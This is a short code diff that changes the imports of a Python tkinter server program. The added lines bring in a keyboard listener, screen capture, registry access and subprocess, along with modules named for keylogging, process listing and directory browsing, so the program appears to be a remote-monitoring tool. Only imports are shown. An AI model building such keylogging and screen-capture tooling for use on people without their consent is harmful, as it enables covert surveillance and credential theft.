@@ -1,9 +1,13 @@
 import tkinter as tk
-import socket, pickle, PIL.ImageGrab, struct, uuid
 import socket, uuid
 import os
 import keylogger_server as kl 
 import app_process_server as ap
+import socket, pickle, PIL.ImageGrab, psutil, struct, uuid
+import os, json, re, winreg, threading, subprocess
+import numpy as np
+from pynput.keyboard import Listener
+import keylogger_server as kl 
 import directory_tree_server as dt
 
 main = tk.Tk()
